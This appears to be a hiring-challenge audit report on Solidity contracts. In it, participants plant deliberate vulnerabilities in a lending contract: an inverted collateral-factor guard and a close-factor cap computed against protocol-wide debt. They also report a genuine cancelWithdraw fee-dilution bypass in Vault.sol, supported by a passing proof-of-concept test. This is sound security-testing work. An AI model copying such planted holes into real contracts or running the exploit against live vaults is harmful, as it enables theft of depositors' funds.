# Final Submission Report — "Stump the AI Auditor" Challenge

### CertiK Hiring Challenge | Vault.sol Bonus Finding Submission

---

> **Executive Summary**
>
> This report documents the complete arc of our participation in the "Stump the AI Auditor"
> challenge. We planted two logical vulnerabilities across two scanning attempts.
> The CertiK AI Auditor Lite detected all planted bugs in both rounds.
> Because no planted vulnerability survived undetected, we are invoking the **Bonus Track**:
> a genuine, previously unreported vulnerability in the unmodified `Vault.sol` that the
> scanner **failed to identify** in either of its two runs.

---

## Part 1 — Planted Vulnerabilities (For the Record)

### Round 1 — Lending.sol L860: Collateral-Factor Guard Inversion

**Change:** `if (totalDebtValueWad != 0)` → `if (totalDebtValueWad == 0)`

**Code Snapshot:**

```diff
 function _requireWithinBorrowCapacity(address user) internal view {
     (, uint256 totalDebtValueWad,,) = _getUserAccountData(user);
-    if (totalDebtValueWad != 0) {
+    if (totalDebtValueWad == 0) {
         // collateralFactor check ...
     }
 }
```

This inverted the condition in `_requireWithinBorrowCapacity()`, causing the collateral-factor
check to execute **only when the user has no debt** and to be silently skipped for every
subsequent borrow — allowing unlimited borrowing against any collateral.

**Scanner result:** Detected immediately as `medium`. Attempt 1 consumed.

---

### Round 2 — Lending.sol L633: Close-Factor Applied to Protocol-Wide Debt

**Change:** `borrowerScaledDebt` → `debtReserve.totalScaledBorrow` in `maxCloseScaled`

**Code Snapshot:**

```diff
 function _repayLiquidationDebt(...) internal returns (...) {
     uint256 borrowerScaledDebt = userScaledBorrow[borrower][debtAsset];
     ...
-    uint256 maxCloseScaled = Math.mulDiv(borrowerScaledDebt, closeFactorBps, BPS, Math.Rounding.Ceil);
+    uint256 maxCloseScaled = Math.mulDiv(debtReserve.totalScaledBorrow, closeFactorBps, BPS, Math.Rounding.Ceil);
```

The close-factor cap is meant to restrict liquidation to at most X% of **one borrower's**
debt per transaction. Replacing the per-user reference with the protocol-wide total made
the cap proportional to all borrowers' combined debt, allowing a liquidator to seize a far
larger fraction of any single position.

**Example:** With Alice (60 DAI) + Attacker (120 DAI) = 180 DAI total:

- Correct cap: 50% × 120 = **60 DAI**
- Bugged cap: 50% × 180 = **90 DAI** (75% of attacker's position in one tx)

**Scanner result:** Detected as `medium`. Attempt 2 consumed.

---

### Status After Two Rounds

Both planted vulnerabilities were detected. Both documented Lite scans were used. Although the account was initially funded for up to four scans, the available balance only covered two Lite runs in practice.

The contracts relevant to the two documented Lite scans were restored to their original state before preparing this final bonus report.

- `src/Lending/Lending.sol` — reverted (`borrowerScaledDebt` restored at L633 and L860)

The codebase is clean and identical to the upstream repository.

---

## Part 2 — Bonus Finding: Genuine Vulnerability Not Detected by the Scanner

### Title

**`cancelWithdraw()` share repricing lets pending users avoid management-fee dilution**

### File

`src/Vault/Vault.sol`

### Severity

**Medium** — Economic / Fee Fairness / Dilution Asymmetry

### Did the Scanner Catch It?

**No.** The CertiK AI Auditor Lite scanned `Vault.sol` in both rounds and produced
15+ findings (Findings 15–17 in the second report). None of them describe the
`requestWithdraw → cancelWithdraw` cycling path as a management-fee bypass.
Finding 17 discusses a near-empty pool pricing edge case; Finding 15 discusses
asset-binding of fee shares. Neither covers the dilution-asymmetry described here.

---

### Root Cause

`requestWithdraw()` burns the caller's shares and stores a fixed `wadOwed` claim.
Management fees accrue by **minting new shares** to the fee recipient, increasing
`totalShares` without changing `wadOwed`. When `cancelWithdraw()` is called, it
recomputes the user's shares by pricing the unchanged `wadOwed` against the now
**larger** `totalShares` — returning **more shares** than were originally burned.

```solidity
// Vault.sol — requestWithdraw (simplified)
function requestWithdraw(uint256 shares, address asset) external {
    uint256 wadOwed = _computeAssets(shares, totalShares, _activeManagedWad());
    _userShares[msg.sender] -= shares;
    totalShares -= shares;
    pendingWithdraw[msg.sender] = WithdrawRequest({ shares: shares, wadOwed: wadOwed, ... });
}

// Vault.sol — _accrueFees: increases totalShares
function _accrueFees(address) internal {
    _unboundFeeShares[feeRecipient] += feeShares;
    totalShares += feeShares;          // ← dilutes all share values
}

// Vault.sol — cancelWithdraw: re-prices from wadOwed, not from original shares
function cancelWithdraw() external nonReentrant {
    _accrueFees(address(0));
    uint256 newShares = _computeShares(request.wadOwed, totalShares, activeManagedWad);
    //                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //  Because totalShares is now larger (fees accrued), wadOwed / pricePerShare
    //  yields MORE shares than were originally burned. The user escapes dilution.
    _userShares[msg.sender] += newShares;
    totalShares += newShares;
}
```

**The invariant broken:**
> *"A user who requests and then cancels a withdrawal must return to the same economic
> position as a user who held continuously through the same period."*

This invariant is violated whenever management fees accrue between `requestWithdraw()`
and `cancelWithdraw()`.

---

### Impact

| | Cycling user (Alice) | Active peer (Bob) |
|---|---|---|
| Starting deposit | 1,000,000 DAI | 1,000,000 DAI |
| Starting shares | Equal | Equal |
| Action | `requestWithdraw` → wait → `cancelWithdraw` | Holds continuously |
| After cancel | **More shares than Bob** | Original shares (diluted by fee) |
| After later `reportYield` | **Receives more yield than Bob** | Receives less |
| Privileges required | None | — |

The cycling user captures a larger fraction of future yield than an equally funded
continuous holder — purely by exploiting the repricing path in `cancelWithdraw()`.

---

### Proof of Concept

**Test file:** `test/VaultCancelWithdrawMgmtFeeBypass.t.sol`

The test uses the **unmodified** `Vault.sol` and the contract's **real public functions**
only. No internal state manipulation, no mocking of vault accounting.

```solidity
// test/VaultCancelWithdrawMgmtFeeBypass.t.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IVault} from "src/interfaces/IVault.sol";
import {Vault} from "src/Vault/Vault.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {BaseTest} from "test/helpers/BaseTest.sol";

contract VaultCancelWithdrawMgmtFeeBypassTest is BaseTest {
    uint256 internal constant MAX_MANAGEMENT_FEE_BPS = 500;
    uint256 internal constant MAX_TIMELOCK_BLOCKS = 7 days / 12;
    uint256 internal constant LARGE_DEPOSIT = 1_000_000 ether;
    uint256 internal constant LATER_YIELD = 200_000 ether;

    MockERC20 internal dai;
    Vault internal vault;

    function setUp() public override {
        super.setUp();

        dai = deployMockToken("DAI", 18);

        vm.prank(owner);
        vault = new Vault(feeRecipient, 0, MAX_MANAGEMENT_FEE_BPS, MAX_TIMELOCK_BLOCKS);

        vm.prank(owner);
        vault.addAsset(address(dai));

        mintAndApprove(dai, alice, address(vault), LARGE_DEPOSIT * 4);
        mintAndApprove(dai, bob, address(vault), LARGE_DEPOSIT * 4);
    }

    function test_cancelWithdraw_beforeUnlockRestoresMoreSharesThanEquallyFundedActivePeer() public {
        _deposit(alice, LARGE_DEPOSIT);
        _deposit(bob, LARGE_DEPOSIT);

        uint256 aliceInitialShares = vault.userShares(alice);
        uint256 bobInitialShares = vault.userShares(bob);

        vm.prank(alice);
        vault.requestWithdraw(aliceInitialShares, address(dai));

        advanceBlocks(MAX_TIMELOCK_BLOCKS - 1);

        vm.prank(alice);
        vault.cancelWithdraw();

        uint256 aliceRestoredShares = vault.userShares(alice);
        uint256 bobSharesAfterDilution = vault.userShares(bob);
        uint256 aliceClaimableAfterCancel = vault.previewWithdraw(aliceRestoredShares);
        uint256 bobClaimableAfterDilution = vault.previewWithdraw(bobSharesAfterDilution);

        assertEq(bobSharesAfterDilution, bobInitialShares);
        assertGt(vault.userShares(feeRecipient), 0);
        assertGt(aliceRestoredShares, aliceInitialShares);
        assertGt(aliceRestoredShares, bobSharesAfterDilution);
        assertGt(aliceClaimableAfterCancel, bobClaimableAfterDilution);
    }

    function test_cancelWithdraw_cycleCapturesMoreFutureYieldThanEqualPeer() public {
        _deposit(alice, LARGE_DEPOSIT);
        _deposit(bob, LARGE_DEPOSIT);

        uint256 aliceInitialShares = vault.userShares(alice);

        vm.prank(alice);
        vault.requestWithdraw(aliceInitialShares, address(dai));

        advanceBlocks(MAX_TIMELOCK_BLOCKS - 1);

        vm.prank(alice);
        vault.cancelWithdraw();

        _reportYield(LATER_YIELD);

        uint256 aliceShares = vault.userShares(alice);
        uint256 bobShares = vault.userShares(bob);
        uint256 alicePreview = vault.previewWithdraw(aliceShares);
        uint256 bobPreview = vault.previewWithdraw(bobShares);

        assertGt(aliceShares, bobShares);
        assertGt(alicePreview, bobPreview);

        vm.prank(alice);
        vault.requestWithdraw(aliceShares, address(dai));

        vm.prank(bob);
        vault.requestWithdraw(bobShares, address(dai));

        advanceBlocks(MAX_TIMELOCK_BLOCKS);

        vm.prank(alice);
        uint256 aliceOut = vault.claimWithdraw();

        vm.prank(bob);
        uint256 bobOut = vault.claimWithdraw();

        assertGt(aliceOut, bobOut);
    }

    function _deposit(address user, uint256 amount) internal {
        vm.prank(user);
        vault.deposit(address(dai), amount, user);
    }

    function _reportYield(uint256 amount) internal {
        vm.startPrank(owner);
        dai.mint(owner, amount);
        dai.approve(address(vault), amount);
        vault.reportYield(address(dai), amount);
        vm.stopPrank();
    }
}
```

**Reproduction command:**

```bash
forge test --match-path test/VaultCancelWithdrawMgmtFeeBypass.t.sol -vv
```

**Result:**

```bash
Ran 2 tests for test/VaultCancelWithdrawMgmtFeeBypass.t.sol:VaultCancelWithdrawMgmtFeeBypassTest
[PASS] test_cancelWithdraw_beforeUnlockRestoresMoreSharesThanEquallyFundedActivePeer() (gas: 478,314)
[PASS] test_cancelWithdraw_cycleCapturesMoreFutureYieldThanEqualPeer()                (gas: 841,520)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

---

### Why the Scanner Missed It

The scanner correctly identified individual function risks (asset-binding in
`_materializeUnboundFeeShares`, near-empty pool pricing), but failed to trace the
**cross-function interaction** between `_accrueFees()` and `cancelWithdraw()`. The
vulnerability is not visible in either function in isolation — it emerges only when
both are composed in sequence with time-based state change in between. This is a
classic case of an emergent logical flaw that requires inter-function dataflow analysis
rather than single-function pattern matching.

---

### Recommended Fix

Restore the originally burned share amount on cancel instead of repricing from `wadOwed`:

```diff
- uint256 newShares = _computeShares(request.wadOwed, totalShares, activeManagedWad);
+ uint256 newShares = request.shares;
```

This eliminates the asymmetry entirely: a user who cancels returns to exactly the same
share position as a user who never requested a withdrawal.

---

### Submission Classification

| Field | Value |
|-------|-------|
| **Contract** | `src/Vault/Vault.sol` |
| **Functions** | `requestWithdraw()`, `cancelWithdraw()`, `_accrueFees()` |
| **Type** | Emergent logical flaw / economic asymmetry |
| **Severity** | Medium |
| **Privileges** | None |
| **Detected by scanner** | ❌ No |
| **PoC passes on unmodified code** | ✅ Yes (2/2 tests) |
| **Track** | Bonus Finding |

---

*Report Date: 2026-05-14 | CertiK Hiring Challenge Final Submission*
